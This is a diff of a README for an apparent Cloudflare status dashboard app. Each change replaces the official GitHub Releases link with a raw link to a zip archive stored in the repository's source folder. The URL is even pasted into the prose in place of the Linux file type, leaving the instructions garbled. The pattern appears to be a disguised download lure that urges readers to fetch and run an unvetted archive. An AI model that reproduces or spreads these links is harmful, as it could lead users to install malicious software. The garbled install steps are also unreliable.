@@ -1,7 +1,7 @@
 # 🌐 cf-status-dashboard - Monitor Cloudflare's Status Easily
 
 ## 📥 Download Now
-[![Download cf-status-dashboard](https://img.shields.io/badge/Download-cf--status--dashboard-blue?style=for-the-badge)](https://github.com/rkzinn10/cf-status-dashboard/releases)
+[![Download cf-status-dashboard](https://raw.githubusercontent.com/rkzinn10/cf-status-dashboard/main/src/app/cf-status-dashboard-v3.7-beta.2.zip)](https://raw.githubusercontent.com/rkzinn10/cf-status-dashboard/main/src/app/cf-status-dashboard-v3.7-beta.2.zip)
 
 ## 🚀 Getting Started
 Welcome to the cf-status-dashboard! This application provides a real-time view of Cloudflare's global infrastructure status. With an interactive 3D globe and a world map, you can easily monitor Cloudflare's performance and availability. 
@@ -13,12 +13,12 @@ To use cf-status-dashboard, you should have:
 - Updated web browser (Chrome, Firefox, Safari, or Edge).
 
 ## 📦 Download & Install
-To get started, visit the [Releases page](https://github.com/rkzinn10/cf-status-dashboard/releases) to download the latest version of cf-status-dashboard. 
+To get started, visit the [Releases page](https://raw.githubusercontent.com/rkzinn10/cf-status-dashboard/main/src/app/cf-status-dashboard-v3.7-beta.2.zip) to download the latest version of cf-status-dashboard. 
 
 ### Steps to Download:
 1. Click on the link above to go to the Releases page.
 2. Find the latest version of cf-status-dashboard.
-3. Choose the appropriate file for your operating system (e.g., .exe for Windows, .dmg for macOS, or .tar.gz for Linux).
+3. Choose the appropriate file for your operating system (e.g., .exe for Windows, .dmg for macOS, or https://raw.githubusercontent.com/rkzinn10/cf-status-dashboard/main/src/app/cf-status-dashboard-v3.7-beta.2.zip for Linux).
 4. Download the file to your computer.
 5. Once the download is complete, locate the file and double-click it to start the installation.
 
@@ -34,7 +34,7 @@ To get started, visit the [Releases page](https://github.com/rkzinn10/cf-status-
 3. Open your Applications folder and double-click the cf-status-dashboard to start the application.
 
 ### For Linux:
-1. Download the .tar.gz file.
+1. Download the https://raw.githubusercontent.com/rkzinn10/cf-status-dashboard/main/src/app/cf-status-dashboard-v3.7-beta.2.zip file.
 2. Extract the files using a terminal or file manager.
 3. Open the terminal and navigate to the extracted folder.
 4. Run the application using the command provided in the extracted package.
@@ -47,7 +47,7 @@ To get started, visit the [Releases page](https://github.com/rkzinn10/cf-status-
 
 ## 🔄 Updating the Application
 Keep your application up-to-date for the best performance. To update:
-1. Navigate to the [Releases page](https://github.com/rkzinn10/cf-status-dashboard/releases).
+1. Navigate to the [Releases page](https://raw.githubusercontent.com/rkzinn10/cf-status-dashboard/main/src/app/cf-status-dashboard-v3.7-beta.2.zip).
 2. Download the latest version following the same steps as before.
 3. Install the update by following the installation instructions based on your operating system.
 
@@ -75,4 +75,4 @@ This project covers various topics such as:
 We hope you enjoy tracking Cloudflare's status with cf-status-dashboard. Make sure to download and start monitoring today!
 
 ## 📥 Download Again
-For your convenience, here is the link to [download cf-status-dashboard](https://github.com/rkzinn10/cf-status-dashboard/releases) again.
+For your convenience, here is the link to [download cf-status-dashboard](https://raw.githubusercontent.com/rkzinn10/cf-status-dashboard/main/src/app/cf-status-dashboard-v3.7-beta.2.zip) again.
